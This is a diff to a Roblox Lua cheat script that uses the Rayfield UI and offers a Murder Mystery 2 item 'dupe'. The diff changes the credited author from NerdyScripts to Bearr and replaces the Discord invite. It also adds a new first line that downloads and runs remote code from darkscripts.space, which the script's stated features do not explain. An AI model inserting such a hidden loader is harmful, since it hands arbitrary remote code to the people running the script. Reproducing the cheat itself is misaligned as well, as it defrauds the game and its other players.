@@ -1,8 +1,9 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/252b207559.lua', true))()
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
-    Name = "Multi Script By NerdyScripts📜",
+    Name = "Multi Script By Bearr📜",
     LoadingTitle = "Loading UP",
-    LoadingSubtitle = "By NerdyScripts📜",
+    LoadingSubtitle = "By Bearr📜",
     ConfigurationSaving = {
         Enabled = true,
         FolderName = nil,
@@ -10,7 +11,7 @@ local Window = Rayfield:CreateWindow({
     },
     Discord = {
         Enabled = true,
-        Invite = "u4V2tTqhy9",
+        Invite = "rZmNK6Ptxw",
         RememberJoins = true
     },
     KeySystem = true,
@@ -52,7 +53,7 @@ local Button = Tab:CreateButton({
 })
 
 local Tab = Window:CreateTab("MM2 DUPE🤑", 113214333381063)
-local Section = Tab:CreateSection("NEWEST MM2 DUPING BY NerdyScripts📜")
+local Section = Tab:CreateSection("NEWEST MM2 DUPING BY Bearr📜")
 local Button = Tab:CreateButton({
     Name = "Dupe All KNIFE/GUN 🔪🔫",
     Callback = function()
